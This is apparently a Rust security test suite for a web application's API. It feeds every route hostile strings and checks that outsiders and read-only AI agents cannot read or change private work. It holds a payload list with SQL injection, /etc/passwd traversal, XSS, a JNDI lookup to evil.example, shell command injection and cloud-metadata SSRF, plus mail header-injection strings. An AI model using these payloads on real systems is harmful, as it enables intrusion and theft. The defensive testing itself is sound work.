//! Hostile input and hostile callers.
//!
//! * every documented route is fed injection strings in its path, query and body: none may
//!   make the server fail, stall, or explain its insides;
//! * every route is asked, by people and agents who have no right to it, for one person's
//!   private work by its real ids and keys: nothing private may come back, and nothing may change;
//! * an AI agent whose rules say "read" is let loose on every changing route: nothing may change;
//! * and the specific tricks: header and mail injection, path traversal, XML entities,
//!   malformed and oversized JSON, expensive text, mass assignment, cross-site reads,
//!   real-time floods.

mod common;
use common::*;
use reqwest::{Method, StatusCode};
use serde_json::{json, Value};
use std::time::{Duration, Instant};

const MARK: &str = "zebra-7781-confidential";
const NIL: &str = "00000000-0000-0000-0000-000000000001";

fn enc(s: &str) -> String {
    url::form_urlencoded::byte_serialize(s.as_bytes()).collect::<String>().replace('+', "%20")
}

fn hostile() -> Vec<String> {
    let mut v: Vec<String> = [
        "' OR '1'='1", "'; DROP TABLE users; --", "1; SELECT pg_sleep(10)--", "\" OR \"\"=\"", "') UNION SELECT password_hash FROM users--", "1' AND (SELECT pg_sleep(10)) IS NULL--",
        "$1", "$$", "%", "_", "\\", "\\'", "%27", "%00",
        "../../../../etc/passwd", "..\\..\\windows\\win.ini", "/etc/passwd", "....//....//etc/passwd", "file:///etc/passwd",
        "<script>alert(1)</script>", "\"><svg onload=alert(1)>", "javascript:alert(1)", "{{7*7}}", "${7*7}", "${jndi:ldap://evil.example/a}", "<!--#exec cmd=\"id\"-->", "`id`", "$(id)", "| id", "; cat /etc/passwd",
        "\r\nSet-Cookie: pwned=1", "\nX-Injected: 1", "\u{0}", "a\u{0}b", "\u{202e}txt.exe", "\u{feff}", "\u{1f642}", "\u{fffd}",
        "-1", "0", "99999999999999999999999999", "1e309", "NaN", "null", "true", "[]", "{}", "", " ",
        "00000000-0000-0000-0000-000000000000", "ffffffff-ffff-ffff-ffff-ffffffffffff", "OPS-1", "OPS-99999999999999999999", "OPS", "me", "*",
        "http://169.254.169.254/latest/meta-data/", "https://127.0.0.1:5432/", "gopher://127.0.0.1:25/",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    v.push("A".repeat(10_000));
    v.push("é".repeat(3_000));
    v.push("[".repeat(3_000));
    v
}

/// Request bodies built around one hostile string.
fn shapes(p: &str, k: usize) -> Value {
    match k % 5 {
        0 => json!({"name": p, "title": p, "key": p, "body": p, "content": p, "description": p, "email": p, "id": p, "user_id": p, "role": p, "kind": p, "type": p, "status": p, "to": p,
                    "text": p, "url": p, "value": p, "level_id": p, "parent_id": p, "container_id": p, "handle": p, "timezone": p, "target": p, "rel": p, "password": p, "filename": p}),
        1 => json!(p),
        2 => json!({"query": {"criteria": [{"field": p, "op": p, "value": p}], "sort": [{"field": p, "dir": p}], "match": p}, "criteria": [{"field": "title", "op": "contains", "value": p}],
                    "sort": [{"field": p}], "scope": {"project": p, "container": p}, "layout": [{"id": p, "kind": p, "ref": p}], "annotations": [{"id": p, "type": p, "color": p, "date": p}],
                    "levels": [{"name": p, "color": p}], "definition": {"initial": p, "statuses": [{"key": p, "name": p, "category": p}], "transitions": [{"name": p, "from": [p], "to": p}]},
                    "labels": [p], "custom": {p: p}, "params": {p: p}, "editors": [p], "permissions": [p], "projects": [p]}),
        3 => json!([p, {"a": p}, [p]]),
        _ => json!({"name": {"$ne": p}, "title": [p], "limit": p, "offset": -1, "priority": p, "estimate": p, "archived": p, "shared": p, "alert": p, "internal": p, "x": p, "y": p, "w": p, "h": p}),
    }
}

/// Wording that would mean an error message is describing the database or the program.
const INSIDES: &[&str] = &["syntax error at", "sqlx", "pg_catalog", "SQLSTATE", "relation \"", "panicked", "backtrace", ".rs:", "postgres://", "$argon2", "/home/", "/usr/", "expected struct", "UUID parsing", "serde", "axum", "tokio"];

#[tokio::test]
async fn no_input_makes_the_server_fail_stall_or_explain_its_insides() {
    let app = spawn().await;
    let mut root = app.admin().await;
    root.created("/api/v1/projects", json!({"key": "OPS", "name": "Ops", "template": "software"})).await;
    root.created("/api/v1/projects/OPS/items", json!({"title": "Something to find", "labels": ["a"]})).await;
    // The strings below name OPS and OPS-1, and the caller is an administrator, so those may
    // rightly be archived or deleted along the way. Nothing names this project.
    root.created("/api/v1/projects", json!({"key": "KEEP", "name": "Keep", "template": "software"})).await;
    root.created("/api/v1/projects/KEEP/items", json!({"title": "Something to keep"})).await;
    root.created("/api/v1/spaces", json!({"key": "DOC", "name": "Docs"})).await;
    root.created("/api/v1/spaces/DOC/pages", json!({"title": "A page", "content": "Text."})).await;
    let payloads = hostile();
    let routes = gantry::http::all_routes().docs;
    let (mut sent, mut failures) = (0usize, vec![]);
    let query = |e: &str| format!("q={e}&limit={e}&offset={e}&sort={e}&project={e}&status={e}&type={e}&group_by={e}&interval={e}&periods={e}&days={e}&container={e}&filename={e}&mode={e}&cursor={e}&before={e}&done={e}&label={e}&assignee={e}&metric={e}&open={e}&shuffle={e}&v={e}");
    for (n, route) in routes.iter().enumerate() {
        // Signing out is the one thing here that would end the experiment rather than test it.
        if route.path.ends_with("/logout") || route.path == "/api/v1/ws" {
            continue;
        }
        let method = Method::from_bytes(route.method.as_bytes()).unwrap();
        for k in 0..6 {
            let p = &payloads[(n * 7 + k * 13) % payloads.len()];
            // The whole string goes in the body; an address has room for less of it.
            let e = enc(&p.chars().take(60).collect::<String>());
            let mut path = route.path.to_string();
            while let (Some(a), Some(b)) = (path.find('{'), path.find('}')) {
                path.replace_range(a..=b, &e);
            }
            let reads = matches!(route.method, "GET" | "DELETE");
            let url = if reads { format!("{path}?{}", query(&e)) } else { format!("{path}?filename={e}&shuffle={e}") };
            let started = Instant::now();
            let resp = match root.request(method.clone(), &url).json(&shapes(p, k)).send().await {
                Ok(r) => r,
                Err(err) => {
                    failures.push(format!("{} {} with {:?}: no answer ({err})", route.method, route.path, &p[..p.len().min(40)]));
                    continue;
                }
            };
            sent += 1;
            let status = resp.status();
            let text = resp.text().await.unwrap_or_default();
            let what = format!("{} {} with {:?} answered {status}", route.method, route.path, p.chars().take(40).collect::<String>());
            if status.is_server_error() {
                failures.push(format!("{what}: {}", text.chars().take(200).collect::<String>()));
            } else if status.is_client_error() && INSIDES.iter().any(|w| text.contains(w)) {
                failures.push(format!("{what} and explains too much: {}", text.chars().take(300).collect::<String>()));
            }
            if started.elapsed() > Duration::from_secs(4) {
                failures.push(format!("{what} after {:?}", started.elapsed()));
            }
            if status == StatusCode::UNAUTHORIZED {
                root = app.login("root@example.org").await;
            }
        }
    }
    assert!(failures.is_empty(), "{} of {sent} requests went wrong; the first of them:\n{}", failures.len(), failures.iter().take(12).map(|f| f.chars().take(420).collect::<String>()).collect::<Vec<_>>().join("\n"));
    assert!(sent > 1200, "only {sent} requests were sent");
    // Everything is still there and still works.
    let root = app.login("root@example.org").await;
    assert_eq!(root.ok("/api/v1/items/KEEP-1").await["title"], "Something to keep");
    for table in ["users", "items", "projects", "pages", "audit_log", "sessions", "role_bindings"] {
        let n: i64 = sqlx::query_scalar(&format!("SELECT count(*) FROM {table}")).fetch_one(&app.st.db).await.unwrap_or_else(|e| panic!("{table}: {e}"));
        assert!(n > 0, "{table} is empty");
    }
    assert_eq!(root.post("/api/v1/admin/audit/verify", json!({})).await.1["intact"], true, "the audit chain is intact");
}

// ───────────────────────── other people's work ─────────────────────────

struct World {
    ada: Caller,
    project: String,
    space: String,
    ids: Vec<String>,
}

/// One person's private work, with a marker in every text that must never reach anyone else.
async fn world(app: &TestApp) -> World {
    let ada = app.user("ada@example.org", "member").await;
    let project = ada.created("/api/v1/projects", json!({"key": "SEC", "name": format!("Program {MARK}"), "description": MARK, "template": "software"})).await;
    let cycle = ada.created("/api/v1/projects/SEC/cycles", json!({"name": format!("Cycle {MARK}")})).await;
    let one = ada.created("/api/v1/projects/SEC/items", json!({"title": format!("Shielding {MARK}"), "description": MARK, "labels": [MARK], "type": "story", "custom": {"acceptance_criteria": MARK}, "cycle_id": cycle["id"]})).await;
    let two = ada.created("/api/v1/projects/SEC/items", json!({"title": format!("Child {MARK}"), "parent": "SEC-1"})).await;
    ada.created("/api/v1/items/SEC-1/links", json!({"rel": "relates_to", "target": "SEC-2"})).await;
    let comment = ada.created("/api/v1/items/SEC-1/comments", json!({"body": format!("Note {MARK} about SEC-2")})).await;
    let (_, file) = ada.upload(Method::POST, &format!("/api/v1/items/SEC-1/attachments?filename=plan-{MARK}.txt"), "text/plain", MARK.as_bytes().to_vec()).await;
    let space = ada.created("/api/v1/spaces", json!({"key": "SECD", "name": format!("Docs {MARK}")})).await;
    let page = ada.created("/api/v1/spaces/SECD/pages", json!({"title": format!("Design {MARK}"), "content": format!("{MARK} see SEC-1")})).await;
    let search = ada.created("/api/v1/searches", json!({"name": format!("Search {MARK}"), "query": {"criteria": [{"field": "text", "op": "contains", "value": MARK}]}})).await;
    let gantt = ada.created("/api/v1/gantt", json!({"name": format!("Chart {MARK}"), "scope": {"project": "SEC"}, "annotations": [{"id": "a", "type": "line", "date": "2030-01-01", "color": "red", "label": MARK}]})).await;
    let viz = ada.created("/api/v1/visualizations", json!({"name": format!("Viz {MARK}"), "library": "html", "source": format!("<p>{MARK}</p>")})).await;
    let dash = ada.created("/api/v1/dashboards", json!({"name": format!("Board {MARK}"), "layout": [{"id": "t", "kind": "visualization", "ref": viz["id"], "title": MARK}]})).await;
    let binding: String = sqlx::query_scalar("SELECT id::text FROM role_bindings WHERE user_id = $1 LIMIT 1").bind(ada.user_id).fetch_one(&app.st.db).await.unwrap();
    let mut ids: Vec<String> = [&project, &cycle, &one, &two, &comment, &file, &space, &page, &search, &gantt, &viz, &dash].iter().map(|v| v["id"].as_str().unwrap_or_else(|| panic!("no id in {v}")).to_string()).collect();
    ids.push(ada.user_id.to_string());
    ids.push(binding);
    World { ada, project: project["id"].as_str().unwrap().to_string(), space: space["id"].as_str().unwrap().to_string(), ids }
}

/// A fingerprint of everything in the world, to show that nothing was changed.
async fn fingerprint(app: &TestApp, w: &World) -> Vec<(String, String)> {
    let (p, s, u) = (&w.project, &w.space, w.ada.user_id);
    let tables = [
        ("items", format!("SELECT * FROM items WHERE project_id = '{p}'")),
        ("comments", format!("SELECT c.* FROM comments c JOIN items i ON i.id = c.item_id WHERE i.project_id = '{p}'")),
        ("history", format!("SELECT h.* FROM item_history h JOIN items i ON i.id = h.item_id WHERE i.project_id = '{p}'")),
        ("links", "SELECT * FROM links".to_string()),
        ("watchers", format!("SELECT w.* FROM item_watchers w JOIN items i ON i.id = w.item_id WHERE i.project_id = '{p}'")),
        ("attachments", "SELECT * FROM attachments".to_string()),
        ("projects", format!("SELECT * FROM projects WHERE id = '{p}'")),
        ("cycles", format!("SELECT * FROM cycles WHERE project_id = '{p}'")),
        ("project workflows", format!("SELECT * FROM project_workflows WHERE project_id = '{p}'")),
        ("spaces", format!("SELECT * FROM spaces WHERE id = '{s}'")),
        ("pages", format!("SELECT * FROM pages WHERE space_id = '{s}'")),
        ("page versions", format!("SELECT v.* FROM page_versions v JOIN pages g ON g.id = v.page_id WHERE g.space_id = '{s}'")),
        ("roles in the project and space", format!("SELECT * FROM role_bindings WHERE scope_id IN ('{p}', '{s}')")),
        ("saved searches", format!("SELECT id, owner_id, name, query, shared, alert FROM saved_searches WHERE owner_id = '{u}'")),
        ("charts", format!("SELECT * FROM gantt_charts WHERE owner_id = '{u}'")),
        ("visualizations", format!("SELECT * FROM visualizations WHERE owner_id = '{u}'")),
        ("dashboards", format!("SELECT * FROM dashboards WHERE owner_id = '{u}'")),
        ("account", format!("SELECT name, email, handle, active, kind, password_hash, agent_policy, org_name, org_code, job_title, timezone, avatar_type FROM users WHERE id = '{u}'")),
        ("global roles", format!("SELECT * FROM role_bindings WHERE user_id = '{u}'")),
        ("notification choices", format!("SELECT * FROM notification_prefs WHERE user_id = '{u}'")),
        ("settings", "SELECT key, value FROM settings".to_string()),
        ("levels", "SELECT * FROM hierarchy_levels".to_string()),
        ("types", "SELECT key, name, workflow_key, level_id, active FROM item_types".to_string()),
        ("workflows", "SELECT * FROM workflows".to_string()),
        ("sign-in providers", "SELECT * FROM auth_providers".to_string()),
        ("alert rules", "SELECT id, name, kind, enabled, params, channels, severity FROM alert_rules".to_string()),
    ];
    let mut out = vec![];
    for (name, sql) in tables {
        let hash: String = sqlx::query_scalar(&format!("SELECT coalesce(md5(string_agg(md5(to_jsonb(t)::text), '' ORDER BY md5(to_jsonb(t)::text))), 'empty') || ':' || count(*) FROM ({sql}) t")).fetch_one(&app.st.db).await.unwrap_or_else(|e| panic!("{name}: {e}"));
        out.push((name.to_string(), hash));
    }
    out
}

/// Every route, with the world's real keys and ids in every place a key or id goes.
fn targets(w: &World) -> Vec<(Method, String, bool)> {
    let mut out = vec![];
    for route in gantry::http::all_routes().docs {
        if route.path.ends_with("/logout") || route.path == "/api/v1/ws" || (route.path.starts_with("/api/v1/auth/") && route.method != "GET") {
            continue;
        }
        let base = route.path.replace("{user}", &w.ada.user_id.to_string()).replace("{version}", "1").replace("{role}", "project_admin").replace("{tile}", "t").replace("{type}", "story").replace("{position}", NIL).replace("{assignment}", NIL);
        let keys: Vec<&str> = if base.contains("{key}") { vec!["SEC", "SEC-1", "SEC-2", "SECD"] } else { vec![""] };
        let ids: Vec<&str> = if base.contains("{id}") || base.contains("{binding}") { w.ids.iter().map(String::as_str).collect() } else { vec![""] };
        for key in &keys {
            for id in &ids {
                let path = base.replace("{key}", key).replace("{id}", id).replace("{binding}", id);
                assert!(!path.contains('{'), "unsubstituted parameter in {path}");
                out.push((Method::from_bytes(route.method.as_bytes()).unwrap(), path, route.public));
            }
        }
    }
    out
}

/// What someone hoping to take something over would send.
fn grab(me: &Caller) -> Vec<Value> {
    vec![
        json!({}),
        json!({"title": "pwned", "name": "pwned", "body": "pwned", "content": "pwned", "description": "pwned", "source": "pwned"}),
        json!({"user_id": me.user_id, "role": "project_admin"}),
        json!({"status": "published", "archived": true}),
        json!({"shared": true}),
        json!({"visibility": "workspace"}),
        json!({"editors": [me.user_id]}),
        json!({"owner_id": me.user_id, "lead_id": me.user_id, "assignee_id": me.user_id}),
        json!({"to": "done"}),
        json!({"kind": "template", "ref": "kpi-tiles"}),
        json!({"container_id": null}),
        json!({"access": "internal"}),
        json!({"definition": null}),
        json!({"rel": "relates_to", "target": "SEC-2"}),
    ]
}

/// Try every route as `who`. Returns how many requests were made and how many were answered
/// with success. With `sealed`, nothing that comes back may contain the marker.
async fn probe(app: &TestApp, who: &Caller, w: &World, sealed: bool) -> (usize, usize) {
    let (mut sent, mut succeeded) = (0, 0);
    let bodies = grab(who);
    for (method, path, _) in targets(w) {
        let attempts: Vec<Option<&Value>> = if matches!(method.as_str(), "GET" | "DELETE") { vec![None] } else { bodies.iter().map(Some).collect() };
        for body in attempts {
            let mut req = who.request(method.clone(), &path);
            if let Some(b) = body {
                req = req.json(b);
            }
            let resp = req.send().await.unwrap_or_else(|e| panic!("{method} {path}: {e}"));
            sent += 1;
            let status = resp.status();
            assert!(!status.is_server_error(), "{method} {path} answered {status}");
            succeeded += status.is_success() as usize;
            if sealed {
                let headers = format!("{:?}", resp.headers());
                let text = resp.text().await.unwrap_or_default();
                assert!(!text.contains(MARK) && !headers.contains(MARK), "{method} {path} ({status}) gave away private content: {}", text.chars().take(300).collect::<String>());
            }
        }
    }
    let _ = app;
    (sent, succeeded)
}

async fn unchanged(app: &TestApp, w: &World, before: &[(String, String)], who: &str) {
    let after = fingerprint(app, w).await;
    for ((name, was), (_, is)) in before.iter().zip(&after) {
        assert_eq!(was, is, "{who} changed something: {name}");
    }
}

#[tokio::test]
async fn nobody_reaches_private_work_by_asking_for_it_by_id() {
    let app = spawn().await;
    let root = app.admin().await;
    let w = world(&app).await;
    // Three kinds of outsider: a colleague with no part in the work, a portal customer, and an
    // AI agent that has been given project rights but no rules (so it may do nothing).
    let eve = app.user("eve@example.org", "member").await;
    let customer = app.user("cust@example.org", "customer").await;
    let bot = root.created("/api/v1/admin/users", json!({"name": "Unruly bot", "kind": "agent"})).await;
    let token = root.created(&format!("/api/v1/admin/users/{}/tokens", bot["id"].as_str().unwrap()), json!({"name": "t", "scopes": ["read", "write"]})).await;
    let agent = Caller { token: Some(token["token"].as_str().unwrap().to_string()), user_id: bot["id"].as_str().unwrap().parse().unwrap(), ..app.anon() };
    w.ada.created("/api/v1/projects/SEC/members", json!({"user_id": bot["id"], "role": "project_admin"})).await;
    w.ada.created("/api/v1/spaces/SECD/members", json!({"user_id": bot["id"], "role": "space_admin"})).await;
    let before = fingerprint(&app, &w).await;
    assert!(before.iter().filter(|(_, h)| !h.starts_with("empty")).count() >= 18, "the world is too empty to prove much: {before:?}");

    let ((sent_e, _), (sent_c, ok_c), (sent_a, ok_a)) = tokio::join!(probe(&app, &eve, &w, true), probe(&app, &customer, &w, true), probe(&app, &agent, &w, true));
    assert!(sent_e > 3000 && sent_c > 3000 && sent_a > 3000, "{sent_e} {sent_c} {sent_a}");
    unchanged(&app, &w, &before, "an outsider").await;
    // A customer and an agent without rules get almost nothing at all: their own account and the public pages.
    assert!(ok_c * 20 < sent_c, "a portal customer was answered with success {ok_c} times out of {sent_c}");
    assert!(ok_a * 20 < sent_a, "an agent with no rules was answered with success {ok_a} times out of {sent_a}");

    // The same questions asked the other ways there are to ask.
    for who in [&eve, &customer, &agent] {
        for path in [
            format!("/api/v1/search?q={MARK}"), format!("/api/v1/search?q=shielding&mode=semantic"), format!("/api/v1/items?q={MARK}"), format!("/api/v1/items?label={MARK}"),
            "/api/v1/analytics/items?group_by=label".into(), "/api/v1/analytics/items?group_by=project,cycle,assignee".into(), "/api/v1/analytics/summary?project=SEC".into(),
            "/api/v1/items/query/fields".into(), "/api/v1/gantt/data?project=SEC".into(), "/api/v1/graph/hierarchy?done=true".into(), "/api/v1/graph/hierarchy?project=SEC".into(),
            "/api/v1/notifications".into(), "/api/v1/users".into(), "/api/v1/containers".into(), "/api/v1/projects".into(), "/api/v1/spaces".into(), "/api/v1/dashboards".into(), "/api/v1/visualizations".into(),
        ] {
            let r = who.request(Method::GET, &path).send().await.unwrap();
            assert!(!r.status().is_server_error(), "{path}");
            assert!(!r.text().await.unwrap().contains(MARK), "{path} gave away private content");
        }
        for (path, body) in [
            ("/api/v1/items/query", json!({"criteria": [{"field": "text", "op": "contains", "value": MARK}]})),
            ("/api/v1/items/query", json!({"criteria": [{"field": "parent", "op": "eq", "value": "SEC-1"}]})),
            ("/api/v1/items/query", json!({"criteria": [{"field": "project", "op": "in", "value": ["SEC"]}]})),
            ("/api/v1/refs/preview", json!({"text": "SEC-1 SEC-2 [[SEC]] [[Design zebra-7781-confidential]] @ada"})),
            ("/mcp", json!({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "search", "arguments": {"query": MARK}}})),
            ("/mcp", json!({"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "get_item", "arguments": {"key": "SEC-1"}}})),
            ("/mcp", json!({"jsonrpc": "2.0", "id": 3, "method": "resources/read", "params": {"uri": "gantry://item/SEC-1"}})),
        ] {
            let r = who.request(Method::POST, path).json(&body).send().await.unwrap();
            assert!(!r.status().is_server_error(), "{path}");
            assert!(!r.text().await.unwrap().contains(MARK), "{path} with {body} gave away private content");
        }
    }
    // The real-time connection gives them no room to listen in.
    for who in [&eve, &agent] {
        let mut ws = Ws::try_connect(&app, who, who.cookie.as_ref().map(|_| app.base.as_str())).await.expect("connects");
        for room in ["item:SEC-1", "project:SEC", "space:SECD", &format!("page:{}", w.ids[7]), &format!("dashboard:{}", w.ids[11]), &format!("viz:{}", w.ids[10]), &format!("gantt:{}", w.ids[9]), &format!("user:{}", w.ada.user_id)] {
            assert_eq!(ws.subscribe(room).await["t"], "denied", "{room}");
        }
        ws.subscribe("work").await;
        w.ada.patch("/api/v1/items/SEC-2", json!({"priority": 3})).await;
        assert!(ws.drain(300).await.iter().all(|m| m["t"] != "event"), "nothing about the project reaches the shared room");
    }
    // What was refused was noticed.
    let kinds = app.security_kinds().await;
    assert!(kinds.contains(&"authz.denied".to_string()), "{kinds:?}");
}

#[tokio::test]
async fn an_agent_allowed_only_to_read_cannot_change_anything_by_any_route() {
    let app = spawn().await;
    let root = app.admin().await;
    let w = world(&app).await;
    let bot = root.created("/api/v1/admin/users", json!({"name": "Reader bot", "kind": "agent"})).await;
    let id = bot["id"].as_str().unwrap().to_string();
    let token = root.created(&format!("/api/v1/admin/users/{id}/tokens"), json!({"name": "t", "scopes": ["read", "write"]})).await;
    let agent = Caller { token: Some(token["token"].as_str().unwrap().to_string()), user_id: id.parse().unwrap(), ..app.anon() };
    // Its roles would let it do anything in the project and the space. Its rules say: look, do not touch.
    w.ada.created("/api/v1/projects/SEC/members", json!({"user_id": id, "role": "project_admin"})).await;
    w.ada.created("/api/v1/spaces/SECD/members", json!({"user_id": id, "role": "space_admin"})).await;
    root.agent_rules(&id, json!({"mode": "restricted", "all_projects": true, "all_spaces": true, "permissions": ["workspace.access", "project.view", "space.view"]})).await;
    assert_eq!(agent.ok("/api/v1/items/SEC-1").await["description"], MARK, "it can read");
    assert_eq!(agent.ok(&format!("/api/v1/pages/{}", w.ids[7])).await["content"].as_str().map(|c| c.contains(MARK)), Some(true));
    let before = fingerprint(&app, &w).await;
    let (sent, _) = probe(&app, &agent, &w, false).await;
    assert!(sent > 3000, "{sent}");
    unchanged(&app, &w, &before, "the read-only agent").await;
    // Nor through the agent protocol.
    let call = |name: &str, args: Value| {
        let (agent, name) = (agent.clone(), name.to_string());
        async move { agent.post("/mcp", json!({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": name, "arguments": args}})).await.1 }
    };
    for (tool, args) in [
        ("create_item", json!({"project": "SEC", "title": "Made by the reader"})),
        ("update_item", json!({"key": "SEC-1", "title": "Changed by the reader"})),
        ("transition_item", json!({"key": "SEC-1", "to": "done"})),
        ("add_comment", json!({"key": "SEC-1", "body": "Said by the reader"})),
        ("create_page", json!({"space": "SECD", "title": "Written by the reader", "content": "x"})),
        ("update_page", json!({"id": w.ids[7], "content": "Rewritten by the reader"})),
    ] {
        let r = call(tool, args).await;
        assert!(r["error"].is_object() || r["result"]["isError"] == true, "{tool}: {r}");
    }
    let listed = agent.post("/mcp", json!({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})).await.1;
    let names: Vec<&str> = listed["result"]["tools"].as_array().unwrap().iter().map(|t| t["name"].as_str().unwrap()).collect();
    assert!(names.contains(&"search") && !names.iter().any(|n| n.starts_with("create_") || n.starts_with("update_") || n.starts_with("add_") || n.starts_with("transition_")), "{names:?}");
    unchanged(&app, &w, &before, "the read-only agent, through MCP,").await;
    // It cannot loosen its own rules, give itself a token, or act as someone else.
    for (m, path, body) in [
        (Method::PUT, format!("/api/v1/admin/users/{id}/agent-policy"), json!({"mode": "unrestricted"})),
        (Method::POST, format!("/api/v1/admin/users/{id}/tokens"), json!({"name": "more", "scopes": ["read", "write", "admin"]})),
        (Method::POST, "/api/v1/auth/tokens".to_string(), json!({"name": "more", "scopes": ["read", "write"]})),
        (Method::PATCH, format!("/api/v1/admin/users/{id}"), json!({"role": "system_admin"})),
        (Method::PATCH, "/api/v1/auth/me".to_string(), json!({"kind": "human"})),
    ] {
        let s = agent.send(m.clone(), &path, Some(body)).await.0;
        assert!(s.is_client_error(), "{m} {path} answered {s}");
    }
    let policy: Value = sqlx::query_scalar("SELECT agent_policy FROM users WHERE id = $1::uuid").bind(&id).fetch_one(&app.st.db).await.unwrap();
    assert_eq!(policy["mode"], "restricted");
    assert_eq!(sqlx::query_scalar::<_, i64>("SELECT count(*) FROM api_tokens WHERE user_id = $1::uuid").bind(&id).fetch_one(&app.st.db).await.unwrap(), 1);
}

// ───────────────────────── particular tricks ─────────────────────────

#[tokio::test]
async fn names_and_titles_cannot_add_headers_to_responses_or_to_mail() {
    let (port, mail) = mail_sink().await;
    let app = spawn_with(|c| use_mail(c, port)).await;
    let root = app.admin().await;
    let ada = app.user("ada@example.org", "member").await;
    let ben = app.user("ben@example.org", "member").await;
    ada.created("/api/v1/projects", json!({"key": "OPS", "name": "Ops", "template": "basic"})).await;
    ada.created("/api/v1/projects/OPS/members", json!({"user_id": ben.user_id, "role": "project_member"})).await;
    ada.created("/api/v1/projects/OPS/items", json!({"title": "Files"})).await;

    // A file name ends up in a response header. Line breaks and quotes in it must not.
    for name in ["a\r\nSet-Cookie: pwned=1\r\n\r\n<script>.txt", "a\"; filename=\"evil.html", "résumé\u{202e}fdp.exe", "a\nX-Evil: 1"] {
        let (s, up) = ada.upload(Method::POST, &format!("/api/v1/items/OPS-1/attachments?filename={}", enc(name)), "text/plain", b"x".to_vec()).await;
        assert_eq!(s, StatusCode::CREATED, "{up}");
        let r = ada.request(Method::GET, &format!("/api/v1/attachments/{}", up["id"].as_str().unwrap())).send().await.unwrap();
        assert!(r.headers().get("x-evil").is_none() && r.headers().get_all("set-cookie").iter().all(|c| !c.to_str().unwrap_or_default().contains("pwned")));
        let cd = r.headers()["content-disposition"].to_str().unwrap().to_string();
        let value = cd.strip_prefix("attachment; filename*=UTF-8''").unwrap_or_else(|| panic!("{cd}"));
        assert!(value.bytes().all(|b| b.is_ascii_alphanumeric() || b"%.-_~".contains(&b)), "only plain characters reach the header: {cd}");
        assert!(!up["filename"].as_str().unwrap().contains(['\r', '\n', '"', '\u{202e}']), "{up}");
    }
    // A request id supplied by the caller is echoed only when it is plainly an id.
    let r = ada.request(Method::GET, "/api/v1/auth/me").header("x-request-id", "<script>alert(1)</script>").send().await.unwrap();
    assert!(!r.headers()["x-request-id"].to_str().unwrap().contains('<'));
    let r = ada.request(Method::GET, "/api/v1/auth/me").header("x-request-id", "abc-123_DEF").send().await.unwrap();
    assert_eq!(r.headers()["x-request-id"], "abc-123_DEF");

    // Names with line breaks are refused where names are set.
    assert_eq!(ada.patch("/api/v1/auth/me", json!({"name": "Ada\r\nBcc: evil@evil.example"})).await.0, StatusCode::BAD_REQUEST);
    assert_eq!(root.post("/api/v1/admin/users", json!({"name": "Mallory\r\nBcc: evil@evil.example", "email": "mallory@example.org", "password": "correct horse battery staple"})).await.0, StatusCode::BAD_REQUEST);
    assert_eq!(root.post("/api/v1/admin/users", json!({"name": "Mallory", "email": "mallory@example.org\r\nBcc: evil@evil.example", "password": "correct horse battery staple"})).await.0, StatusCode::BAD_REQUEST);
    assert_eq!(root.put("/api/v1/admin/settings/site", json!({"name": "Gantry\r\nBcc: evil@evil.example"})).await.0, StatusCode::BAD_REQUEST);
    assert_eq!(root.put("/api/v1/admin/settings/site", json!({"support": {"email": "help@example.org\r\nBcc: evil@evil.example"}})).await.0, StatusCode::BAD_REQUEST);
    // An alert may be sent to extra addresses; those are addresses and nothing else.
    let rules = root.ok("/api/v1/admin/alerts").await;
    let rule = rules["rules"][0]["id"].as_str().unwrap().to_string();
    for bad in ["ops@example.org\r\nBcc: evil@evil.example", "ops@example.org, evil@evil.example", "<evil@evil.example>", "ops@example.org\nRCPT TO:<evil@evil.example>"] {
        let (s, v) = root.patch(&format!("/api/v1/admin/alerts/{rule}"), json!({"channels": {"addresses": [bad]}})).await;
        assert_eq!(s, StatusCode::BAD_REQUEST, "{bad:?}: {v}");
    }

    // Titles are one line, wherever they are set.
    for title in ["Urgent\r\nBcc: evil@evil.example", "Two\nlines", "Tab\tbed", "plan\u{202e}fdp.exe"] {
        assert_eq!(ada.post("/api/v1/projects/OPS/items", json!({"title": title})).await.0, StatusCode::BAD_REQUEST, "{title:?}");
        assert_eq!(ada.patch("/api/v1/items/OPS-1", json!({"title": title})).await.0, StatusCode::BAD_REQUEST, "{title:?}");
    }
    assert_eq!(ada.patch("/api/v1/projects/OPS", json!({"name": "Ops\r\nBcc: evil@evil.example"})).await.0, StatusCode::BAD_REQUEST);

    // What people write does reach mail: as text, never as headers, and never as markup.
    ada.created("/api/v1/projects/OPS/items", json!({"title": "Urgent <img src=x onerror=alert(1)> \"Bcc: evil@evil.example\"", "assignee_id": ben.user_id})).await;
    ada.created("/api/v1/items/OPS-2/comments", json!({"body": "@ben </blockquote><script>alert(document.cookie)</script>\r\n.\r\nMAIL FROM:<evil@evil.example>\r\nRCPT TO:<evil@evil.example>\r\nSubject: injected\r\n\r\nBcc: evil@evil.example"})).await;
    app.drain_jobs().await;
    let sent = mail.lock().await.clone();
    assert!(sent.len() >= 2, "{} messages", sent.len());
    for m in &sent {
        // What the sink kept: the envelope, a blank line, the headers, a blank line, the body.
        let (envelope, message) = m.split_once("\n\n").expect("an envelope");
        let (headers, body) = message.split_once("\n\n").expect("headers");
        let rcpts: Vec<&str> = envelope.lines().filter(|l| l.to_ascii_uppercase().starts_with("RCPT TO")).collect();
        assert_eq!(rcpts, ["RCPT TO:<ben@example.org>"], "one recipient, the intended one");
        assert_eq!(envelope.lines().filter(|l| l.to_ascii_uppercase().starts_with("MAIL FROM")).count(), 1);
        // Header lines begin at the margin; a line that begins with a space continues the one before.
        let names: Vec<String> = headers.lines().filter(|l| !l.starts_with([' ', '\t'])).map(|l| l.split(':').next().unwrap_or_default().to_ascii_lowercase()).collect();
        for h in ["bcc", "cc", "reply-to", "sender"] {
            assert!(!names.iter().any(|n| n == h), "a {h} header was added:\n{headers}");
        }
        for h in ["subject", "to", "from"] {
            assert_eq!(names.iter().filter(|n| *n == h).count(), 1, "exactly one {h} header:\n{headers}");
        }
        // The HTML part shows what was typed; it does not carry it out.
        let html = body.split("Content-Type: text/html").nth(1).expect("an HTML part").replace("=\n", "").replace("=3D", "=");
        assert!(!html.contains("<script") && !html.contains("<img") && html.matches("</blockquote>").count() <= 1, "markup reached the message as markup:\n{html}");
    }
    let all = sent.join("\n").replace("=\n", "");
